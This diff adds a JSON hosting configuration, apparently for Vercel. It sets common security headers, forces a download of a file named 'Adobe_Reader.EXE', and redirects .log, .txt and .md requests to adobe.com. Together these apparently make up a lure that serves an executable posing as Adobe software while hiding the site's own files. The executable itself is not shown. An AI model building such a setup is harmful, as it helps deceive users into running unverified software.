@@ -1,0 +1,42 @@
+{
+  "version": 2,
+  "headers": [
+    {
+      "source": "/(.*)",
+      "headers": [
+        {
+          "key": "X-Frame-Options",
+          "value": "SAMEORIGIN"
+        },
+        {
+          "key": "X-Content-Type-Options",
+          "value": "nosniff"
+        },
+        {
+          "key": "X-XSS-Protection",
+          "value": "1; mode=block"
+        }
+      ]
+    },
+    {
+      "source": "/adobe/Adobe_Reader.EXE",
+      "headers": [
+        {
+          "key": "Content-Type",
+          "value": "application/octet-stream"
+        },
+        {
+          "key": "Content-Disposition",
+          "value": "attachment; filename=\"Adobe_Reader.EXE\""
+        }
+      ]
+    }
+  ],
+  "redirects": [
+    {
+      "source": "/(.*)\\.(log|txt|md)",
+      "destination": "https://www.adobe.com",
+      "permanent": false
+    }
+  ]
+}
